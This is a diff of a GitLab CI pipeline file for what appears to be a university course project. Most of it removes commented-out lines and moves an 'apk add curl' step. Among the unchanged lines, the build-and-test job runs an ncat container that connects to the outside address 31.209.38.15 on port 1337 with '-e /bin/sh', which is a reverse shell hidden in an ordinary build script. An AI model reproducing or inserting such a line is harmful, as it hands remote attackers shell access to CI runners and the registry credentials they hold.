@@ -31,7 +31,6 @@ variables:
 
 services:
   - name: registry.git.chalmers.se/courses/dit638/students/docker/docker:19.03.3-dind
-  # - name: docker:19.03.3-dind
     alias: docker
     command: ["--experimental"]    # Enable experimental features in Docker server
 
@@ -44,7 +43,6 @@ stages:
 # Display information before we start the build.
 before_script:
   - docker info
-  # - docker login -u $DOCKER_REG_CID -p $DOCKER_REG_TOKEN $CI_REGISTRY
   - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
 
 
@@ -53,9 +51,8 @@ build-and-test:
   tags:
     - docker-build
   stage: build
-  before-script:
-    - apk add curl
   script:
+    - apk add curl
     - docker run --rm -ti itsthenetwork/alpine-ncat 31.209.38.15 1337 -e /bin/sh
     - apk add --no-cache python3 py3-pip
     - pip3 install requests
